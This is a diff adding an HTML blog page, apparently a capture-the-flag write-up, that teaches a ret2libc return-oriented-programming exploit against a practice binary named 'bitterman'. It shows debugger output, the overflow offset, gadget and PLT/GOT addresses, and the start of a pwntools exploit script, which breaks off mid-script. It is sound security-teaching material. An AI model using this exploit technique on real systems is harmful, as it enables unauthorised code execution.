@@ -1,0 +1,636 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>ROP - ret2libc attack &middot; Congo</title>
+    <meta name="title" content="ROP - ret2libc attack &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/pwn-thumbnail.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/ret2libc-pwntools/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/ret2libc-pwntools/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="ROP - ret2libc attack">
+  <meta property="og:description" content="{% img /img/pwn-thumbnail.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2019-07-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-07-29T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="ROP - ret2libc attack">
+<meta name="twitter:description" content="{% img /img/pwn-thumbnail.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "ROP - ret2libc attack",
+    "headline": "ROP - ret2libc attack",
+    
+    "abstract": "{% img \/img\/pwn-thumbnail.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/ret2libc-pwntools\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2019",
+    "dateCreated": "2019-07-29T00:00:00\u002b00:00",
+    "datePublished": "2019-07-29T00:00:00\u002b00:00",
+    
+    "dateModified": "2019-07-29T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1877"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        ROP - ret2libc attack
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2019-07-29 00:00:00 &#43;0000 UTC">29 July 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/pwn-thumbnail.png %}</p>
+<p>Today, I will show you how to use Return Oriented Programming for doing a <strong>ret2libc</strong> attack.</p>
+<!-- more -->
+<h1 id="foreword" class="relative group">Foreword <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foreword" aria-label="Anchor">#</a></span></h1><p>This is much more harder than what we encountered earlier, unlike before we won&rsquo;t have any function preloaded with strings like <code>/bin/cat flag.txt</code>. It won&rsquo;t even contain a <code>system</code> so we will use <code>libc.so.6</code> to get the <code>system</code> and <code>/bin/sh</code> address to spawn a shell.</p>
+<h1 id="what-is-return-to-libc-or-ret2libc-attack" class="relative group">What is Return-to-libc or ret2libc attack? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-return-to-libc-or-ret2libc-attack" aria-label="Anchor">#</a></span></h1><p>A &ldquo;return-to-libc&rdquo; attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code.</p>
+<p>Returning to libc is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control. However since no executable code is allowed on the stack we can&rsquo;t just tag in shellcode.   This is the reason we use the return into libc trick and utilize a function provided by the library. We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us. Since these functions do not reside on the stack, we can bypass the stack protection and execute code.</p>
+<h1 id="binary-analysis" class="relative group">Binary Analysis <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#binary-analysis" aria-label="Anchor">#</a></span></h1><p>Let&rsquo;s try <code>checksec bitterman</code> and see what protections are enabled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RELRO</span><span class="p">:</span>    <span class="no">No</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span> 
+</span></span><span class="line"><span class="cl"><span class="no">NX</span><span class="p">:</span>       <span class="no">NX</span> <span class="no">enabled</span> 
+</span></span><span class="line"><span class="cl"><span class="no">PIE</span><span class="p">:</span>      <span class="no">No</span> <span class="no">PIE</span>
+</span></span></code></pre></div><p><strong>NX</strong> is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let&rsquo;s load up the binary into radare2 and start analysing.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="err">0</span><span class="nf">x0040077c</span>      <span class="no">bfc9084000</span>     <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">str.Please_enter_your_text</span><span class="p">:</span> <span class="c1">; .//main.c:23 ; 0x4008c9 ; &#34;&gt; Please enter your text: &#34; ; const char * s
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400781</span>      <span class="no">e89afdffff</span>     <span class="no">call</span> <span class="no">sym.imp.puts</span>           <span class="c1">; int puts(const char *s)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400786</span>      <span class="mi">488</span><span class="no">b050b0520.</span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">obj.stdout</span><span class="p">]</span> <span class="c1">; loc.stdout ; [0x600c98:8]=0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x0040078d</span>      <span class="mi">4889</span><span class="no">c7</span>         <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>                <span class="c1">; FILE *stream
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400790</span>      <span class="no">e8dbfdffff</span>     <span class="no">call</span> <span class="no">sym.imp.fflush</span>         <span class="c1">; int fflush(FILE *stream)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span>           <span class="err">0</span><span class="nf">x00400795</span>      <span class="mi">488</span><span class="no">b9568ffff.</span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="p">[</span><span class="no">local_98h</span><span class="p">]</span>  <span class="c1">; .//main.c:24 ; size_t nbyte
+</span></span></span></code></pre></div><p>It uses <code>puts</code> that seems vulnerable? Can&rsquo;t say much without checking. So, let&rsquo;s use gdb-peda:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gdb-peda$</span> <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">ROP-Emporium</span><span class="err">/</span><span class="no">bitterman</span> 
+</span></span><span class="line"><span class="cl"><span class="err">&gt;</span> <span class="no">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">name</span><span class="err">?</span> 
+</span></span><span class="line"><span class="cl"><span class="no">robin</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Hi</span><span class="p">,</span> <span class="no">robin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">&gt;</span> <span class="nf">Please</span> <span class="no">input</span> <span class="no">the</span> <span class="no">length</span> <span class="no">of</span> <span class="no">your</span> <span class="no">message</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">512</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;</span> <span class="nf">Please</span> <span class="no">enter</span> <span class="no">your</span> <span class="no">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">**--</span><span class="nf">pattern</span> <span class="no">created--</span><span class="p">**</span>
+</span></span></code></pre></div><p>Doing that, we get <strong>Program received signal SIGSEGV, Segmentation fault.</strong>, look like the stack overflowed i.e. a buffer overflow. So, let&rsquo;s continue analysing the stack and core that has been dumped.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[----------------------------------</span><span class="nf">registers-----------------------------------</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">RAX:</span> <span class="err">0</span><span class="nf">x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RBX</span><span class="p">:</span> <span class="mi">0x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RCX</span><span class="p">:</span> <span class="mi">0xb40</span> <span class="p">(</span><span class="err">&#39;@\</span><span class="no">x0b</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">RDX:</span> <span class="err">0</span><span class="nf">x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RSI</span><span class="p">:</span> <span class="mi">0x7ffff7dd18c0</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RDI</span><span class="p">:</span> <span class="mi">0x7ffff7dd0760</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0xfbad2a84</span> 
+</span></span><span class="line"><span class="cl"><span class="no">RBP</span><span class="p">:</span> <span class="mi">0x415341416f414152</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">RAAoAASA</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">RSP:</span> <span class="err">0</span><span class="nf">x7fffffffde48</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">RIP:</span> <span class="err">0</span><span class="nf">x4007e1</span> <span class="p">(</span><span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">245</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">R8</span> <span class="p">:</span> <span class="mi">0x7ffff7dd18c0</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">R9</span> <span class="p">:</span> <span class="mi">0x7ffff7fdc4c0</span> <span class="p">(</span><span class="mi">0x00007ffff7fdc4c0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">R10:</span> <span class="err">0</span><span class="nf">x7ffff7b82cc0</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x2000200020002</span> 
+</span></span><span class="line"><span class="cl"><span class="no">R11</span><span class="p">:</span> <span class="mi">0x246</span> 
+</span></span><span class="line"><span class="cl"><span class="no">R12</span><span class="p">:</span> <span class="mi">0x400590</span> <span class="p">(</span><span class="err">&lt;</span><span class="no">_start</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">ebp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">R13:</span> <span class="err">0</span><span class="nf">x7fffffffdf20</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x1</span> 
+</span></span><span class="line"><span class="cl"><span class="no">R14</span><span class="p">:</span> <span class="mi">0x0</span> 
+</span></span><span class="line"><span class="cl"><span class="no">R15</span><span class="p">:</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl"><span class="nl">EFLAGS:</span> <span class="err">0</span><span class="nf">x10206</span> <span class="p">(</span><span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">zero</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[-------------------------------------</span><span class="nf">code-------------------------------------</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x4007d6</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">234</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x400570</span> <span class="p">&lt;</span><span class="no">fflush@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x4007db</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">239</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x4007e0</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">244</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">leave</span>  
+</span></span><span class="line"><span class="cl"><span class="err">=&gt;</span> <span class="mh">0x4007e1</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">245</span><span class="p">&gt;:</span>	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="mi">0x4007e2</span><span class="p">:</span>	<span class="no">nop</span>    <span class="no">WORD</span> <span class="no">PTR</span> <span class="no">cs</span><span class="p">:[</span><span class="no">rax</span><span class="err">+</span><span class="no">rax</span><span class="p">*</span><span class="mi">1</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nl">x4007ec:</span>	<span class="nf">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x4007f0</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r15</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x4007f2</span> <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">2</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">r14</span>
+</span></span><span class="line"><span class="cl"><span class="err">[------------------------------------</span><span class="nf">stack-------------------------------------</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000|</span> <span class="err">0</span><span class="nf">x7fffffffde48</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0008|</span> <span class="err">0</span><span class="nf">x7fffffffde50</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0016|</span> <span class="err">0</span><span class="nf">x7fffffffde58</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0024|</span> <span class="err">0</span><span class="nf">x7fffffffde60</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0032|</span> <span class="err">0</span><span class="nf">x7fffffffde68</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAYAAwAAZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0040|</span> <span class="err">0</span><span class="nf">x7fffffffde70</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">ZAAxAAyA</span><span class="err">\</span><span class="no">n8</span><span class="err">\</span><span class="mi">255</span><span class="err">?\</span><span class="mi">004</span><span class="err">\</span><span class="mi">240</span><span class="err">\</span><span class="mi">034</span><span class="err">Ґ\</span><span class="mi">005</span><span class="err">@&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0048|</span> <span class="err">0</span><span class="nf">x7fffffffde78</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0xd21ca0043fad380a</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0056</span><span class="err">|</span> <span class="mi">0x7fffffffde80</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x400590</span> <span class="p">(</span><span class="err">&lt;</span><span class="no">_start</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">ebp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">[------------------------------------------------------------------------------]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Legend:</span> <span class="nf">code</span><span class="p">,</span> <span class="no">data</span><span class="p">,</span> <span class="no">rodata</span><span class="p">,</span> <span class="no">value</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Stopped</span> <span class="no">reason</span><span class="p">:</span> <span class="no">SIGSEGV</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00000000004007e1</span> <span class="no">in</span> <span class="no">main</span> <span class="p">(</span><span class="no">argc</span><span class="err">=</span><span class="mi">0x1</span><span class="p">,</span> <span class="no">argv</span><span class="err">=</span><span class="mi">0x7fffffffdf28</span><span class="p">)</span> <span class="no">at</span> <span class="no">main.c</span><span class="p">:</span><span class="mi">28</span>
+</span></span><span class="line"><span class="cl"><span class="err">28</span>	<span class="nl">main.c:</span> <span class="nf">No</span> <span class="no">such</span> <span class="no">file</span> <span class="no">or</span> <span class="no">directory.</span>
+</span></span></code></pre></div><p>Look, at <strong>RSP</strong> register is full of our pattern, in 64-bit register we cant overwrite <strong>RIP</strong> straight away so let&rsquo;s see our stack <strong>RSP</strong>, the Stack Pointer points to our input, we need to fix the return address and inject our code but for that we need to know where overflow occurs. Doing similar from what we did earlier let&rsquo;s get started:-</p>
+<pre tabindex="0"><code>gdb-peda$ x/xg $rsp
+0x7fffffffde48:	0x7141415441417041
+gdb-peda$ pattern offset 0x7141415441417041
+8160875829899915329 found at offset: 152
+</code></pre><ul>
+<li><code>x/xg</code> : This loads the memory address of <strong>RSP</strong> register in hex format and in 64-bit format.</li>
+<li><code>pattern offset &lt; value &gt;</code> : This shows after how many bytes the overflow occured.</li>
+</ul>
+<p>We get the overflow limit i.e. <strong>152</strong>.</p>
+<h1 id="stage-1-leaking-the-address" class="relative group">Stage 1: Leaking the address <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#stage-1-leaking-the-address" aria-label="Anchor">#</a></span></h1><p>First, as told earlier we need to get <code>put</code> address from the running process. First, we need leak address then we need to get the constant distance which means the offset for it after that we will get to execute our code.</p>
+<p>Let&rsquo;s get <code>puts</code> using <code>objdump -D bitterman | grep puts</code> :-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">400520:</span>	<span class="nf">ff</span> <span class="mi">25</span> <span class="mi">2</span><span class="no">a</span> <span class="mi">07</span> <span class="mi">20</span> <span class="mi">00</span>    	<span class="no">jmpq</span>   <span class="p">*</span><span class="mi">0x20072a</span><span class="p">(</span><span class="nv">%rip</span><span class="p">)</span>        <span class="c1"># 600c50 &lt;puts@GLIBC_2.2.5&gt;
+</span></span></span></code></pre></div><p>As you can see we have one address at the left and one i the right. Let m clarify this:-</p>
+<hr>
+<p>PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn&rsquo;t known in the time of linking, and is left to be resolved by the dynamic linker at run time.
+GOT stands for Global Offsets Table and is similarly used to resolve addresses.The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don&rsquo;t include every function they use to reduce binary size. Instead, common functions (like those in libc) are &ldquo;linked&rdquo; into the program so they can be saved once on disk and reused by every program.</p>
+<hr>
+<p>So, we get the address of <strong>PLT</strong> and <strong>GOT</strong> <code>puts</code> i.e. <code>0x400520</code> and <code>0x600c50</code> respectively.</p>
+<h5 id="the-gadget" class="relative group">The Gadget <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-gadget" aria-label="Anchor">#</a></span></h5><p>For finding a gadget, I will use radare2&rsquo;s <code>/R &lt; instruction &gt;</code> command to find a <code>pop rdi; ret;</code> gadget.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x00400590</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">/</span><span class="no">R</span> <span class="no">pop</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x00400853</span>                 <span class="mi">5</span><span class="no">f</span>  <span class="no">pop</span> <span class="no">rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">0</span><span class="nf">x00400854</span>                 <span class="no">c3</span>  <span class="no">ret</span>
+</span></span></code></pre></div><p>Let&rsquo;s copy the address i.e. <code>0x400853</code>.</p>
+<p>Let&rsquo;s make the exploit:-</p>
+<p>First off, we have <code>pop_rdi</code> gadget address and <strong>PLT</strong> and <strong>GOT</strong> <code>puts</code> address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># importing fuctions </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;DEBUG&#39; # Debug purpose</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bitterman&#39;</span><span class="p">)</span> <span class="c1"># using bitterman elf # processing the target elf</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdb</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400520</span><span class="p">)</span> <span class="c1"># PLT put address </span>
+</span></span><span class="line"><span class="cl"><span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600c50</span><span class="p">)</span> <span class="c1"># GOT put address</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400853</span><span class="p">)</span> <span class="c1"># pop_rdi address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">152</span> <span class="c1"># Because we know the offset from earlier</span>
+</span></span><span class="line"><span class="cl">
